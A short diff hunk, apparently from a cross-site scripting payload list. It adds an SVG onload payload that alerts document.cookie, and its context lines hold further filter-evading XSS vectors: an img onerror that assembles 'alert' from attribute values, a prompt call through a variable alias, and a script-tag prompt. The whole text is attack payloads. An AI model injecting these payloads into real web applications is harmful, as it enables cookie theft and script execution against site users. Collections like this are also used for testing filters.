@@ -99,6 +99,7 @@ content['alert'](6)
  
  
  //xsschop
+ <svg src=? onload="a(this);function a()(alert(document.cookie))">
  <img  alt=al lang=ert  src=? onerror=top[alt%2blang]`0`>
  <img src=?  onerror=_=prompt,_`?` >
  <script>prompt`?`</script>
